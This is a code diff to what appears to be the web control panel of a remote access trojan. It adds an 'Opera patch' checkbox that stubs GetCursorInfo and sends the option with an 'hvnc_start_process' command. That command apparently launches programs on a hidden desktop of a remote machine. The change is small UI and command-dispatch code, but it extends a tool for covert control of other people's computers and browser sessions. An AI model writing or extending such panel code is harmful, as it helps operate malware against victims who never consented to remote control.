@@ -1116,7 +1116,12 @@ import { checkFeatureAccess } from "./feature-gate.js";
           class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-3 focus:outline-none focus:border-violet-500" />
         <label class="block text-xs text-slate-400 mb-1">Arguments (optional)</label>
         <input id="hvncCustomExeArgs" type="text" placeholder="--flag value"
-          class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-4 focus:outline-none focus:border-violet-500" />
+          class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 mb-3 focus:outline-none focus:border-violet-500" />
+        <label class="flex items-center gap-2 text-xs text-slate-400 mb-4 cursor-pointer select-none">
+          <input id="hvncCustomExeOperaPatch" type="checkbox"
+            class="accent-violet-500 w-3.5 h-3.5 rounded" />
+          Apply Opera patch (stub GetCursorInfo)
+        </label>
         <div class="flex justify-end gap-2">
           <button id="hvncCustomExeCancel" class="button ghost text-sm">Cancel</button>
           <button id="hvncCustomExeRun" class="button primary text-sm">Run</button>
@@ -1134,7 +1139,8 @@ import { checkFeatureAccess } from "./feature-gate.js";
       if (!exePath) return;
       const args = argsInput.value.trim();
       const cmd = args ? `"${exePath}" ${args}` : `"${exePath}"`;
-      sendCmd("hvnc_start_process", { path: cmd });
+      const operaPatch = document.getElementById("hvncCustomExeOperaPatch").checked;
+      sendCmd("hvnc_start_process", { path: cmd, opera_patch: operaPatch });
       close();
     }
     document.getElementById("hvncCustomExeRun").addEventListener("click", run);
